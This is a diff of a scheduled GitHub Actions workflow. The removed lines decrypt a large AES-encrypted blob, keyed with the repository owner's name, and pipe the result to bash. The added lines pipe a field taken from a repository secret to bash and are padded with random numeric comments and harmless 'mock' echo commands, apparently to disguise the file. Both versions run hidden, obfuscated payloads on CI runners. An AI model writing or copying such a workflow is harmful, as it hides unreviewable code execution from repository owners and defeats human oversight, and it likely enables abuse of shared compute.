@@ -1,15 +1,21 @@
-name: budajian3691
-on:
-  workflow_dispatch:
-  schedule:
-    - cron: '7 2/6 * * *'
-jobs:
-  build:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: budajian3691
-        env:
-          Parameters: ${{ secrets.Parameters }}
+name: budajian3691 #29905
+on: #5275
+  workflow_dispatch: #11669
+  schedule: #27355
+    - cron: '25 4/6 * * *' #14000
+jobs: #24754
+  build: #14353
+    runs-on: ubuntu-latest #7412
+    steps: #16959
+      - uses: actions/checkout@v4 #80
+      - name: budajian3691 #5577
+        env: #21586
+          z435: ${{ secrets.z435 }} #13820
         run: |
-          echo "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" | openssl enc -d -aes-256-cbc -base64 -A -salt -pbkdf2 -pass pass:${GITHUB_REPOSITORY_OWNER} | /bin/bash
+          echo $z435 | jq -r .x15841 | /bin/bash #11779
+          echo "Exit mock: exit 0 2>/dev/null || true"
+          echo "Brace exp: echo file_{1..3}.txt"
+          echo "Math floor: echo \$(( 5 / 2 ))"
+          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          echo "Range loop: for i in 1 3 5; do echo \$i; done"
